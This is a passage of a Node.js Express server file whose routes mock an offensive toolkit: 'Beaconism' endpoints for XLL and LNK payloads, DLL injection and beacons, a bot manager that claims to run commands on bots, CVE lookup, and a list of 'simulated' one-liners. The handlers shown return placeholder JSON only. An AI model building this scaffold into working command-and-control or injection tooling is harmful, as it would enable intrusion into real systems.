  app.post('/http-bot-monitor', express.json(), (req, res) => res.json({ monitorId: `mon-${Date.now()}` }));

  // ── Beaconism ───────────────────────────────────────────────────
  app.post('/beaconism-xll', express.json(), (req, res) => {
    res.json({ xll: `xll_${Date.now()}.xll`, success: true, template: req.body.template });
  });
  app.post('/beaconism-lnk', express.json(), (req, res) => {
    res.json({ lnk: `shortcut_${Date.now()}.lnk`, success: true });
  });
  app.post('/beaconism-mutex', express.json(), (req, res) => {
    res.json({ handle: `0x${crypto.randomBytes(4).toString('hex')}`, success: true });
  });
  app.post('/beaconism-dll', express.json(), (req, res) => {
    res.json({ result: 'injected', target: req.body.target, method: req.body.method, success: true });
  });
  app.post('/beaconism-beacon', express.json(), (req, res) => {
    res.json({ beaconId: `beacon-${Date.now()}`, server: req.body.server, status: 'active' });
  });

  // ── Bot Manager ─────────────────────────────────────────────────
  app.get('/api/bots', (req, res) => res.json({ bots: [] }));
  app.post('/api/bots/register', express.json(), (req, res) => {
    res.json({ bot: { id: `bot-${Date.now()}`, name: req.body.name, type: req.body.type, status: 'active', endpoint: req.body.endpoint, lastSeen: new Date().toISOString() } });
  });
  app.post('/api/bots/:id/command', express.json(), (req, res) => {
    res.json({ response: `Command '${req.body.command}' executed on bot ${req.params.id}` });
  });

  // ── CVE ─────────────────────────────────────────────────────────
  app.post('/api/cve/analyze', express.json(), (req, res) => {
    const cve = CVE_DB.find(c => c.cveId === req.body.cveId) || {
      cveId: req.body.cveId, severity: 'Unknown', score: 0,
      description: `Analysis for ${req.body.cveId}`, affectedProducts: [],
      exploitAvailable: false, patchAvailable: false
    };
    res.json({ ...cve, analysisType: req.body.analysisType || 'full', status: 'analyzed', timestamp: new Date().toISOString(), references: [] });
  });

  app.get('/api/cve/database/status', (req, res) => res.json({
    totalCVEs: CVE_DB.length, recentCVEs: 3, criticalCVEs: CVE_DB.filter(c => c.severity === 'Critical').length,
    lastUpdated: new Date().toISOString()
  }));

  app.get('/api/cve/search', (req, res) => {
    let results = [...CVE_DB];
    if (req.query.severity) results = results.filter(c => c.severity === req.query.severity);
    if (req.query.product) results = results.filter(c => c.affectedProducts.some(p => p.toLowerCase().includes(req.query.product.toLowerCase())));
    res.json({ total: results.length, results: results.map(c => ({ cveId: c.cveId, severity: c.severity, score: c.score })) });
  });

  // ── One-Liners ──────────────────────────────────────────────────
  app.get('/api/one-liners/list', (req, res) => res.json(ONE_LINERS));

  app.post('/api/one-liners/execute', express.json(), (req, res) => {
    const liner = ONE_LINERS[req.body.name];
    if (!liner) return res.json({ success: false, error: 'One-liner not found' });
    res.json({ success: true, output: `[Simulated] ${liner.name}: ${liner.code}`, error: null });
  });

  // ── Catch-all for unmatched API routes ──────────────────────────
  app.all('/api/{*path}', (req, res) => {
    res.json({ success: true, message: 'Endpoint handled by embedded server', method: req.method, path: req.path });
  });

  return app;
}

// ── Start/Stop ──────────────────────────────────────────────────────
async function startEmbeddedServer() {
  await ensureDirectories();
  await engine.initialize();
  const app = createApp();
  return new Promise((resolve, reject) => {
    server = app.listen(PORT, '127.0.0.1', () => {
      console.log(`[EmbeddedAPI] Running on http://127.0.0.1:${PORT}`);
      resolve(server);
    });
    server.on('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        console.log(`[EmbeddedAPI] Port ${PORT} already in use — assuming server is already running`);
        resolve(null);
      } else {
        reject(err);
      }
    });
  });
}

function stopEmbeddedServer() {
  if (server) { server.close(); server = null; }
}

module.exports = { startEmbeddedServer, stopEmbeddedServer };
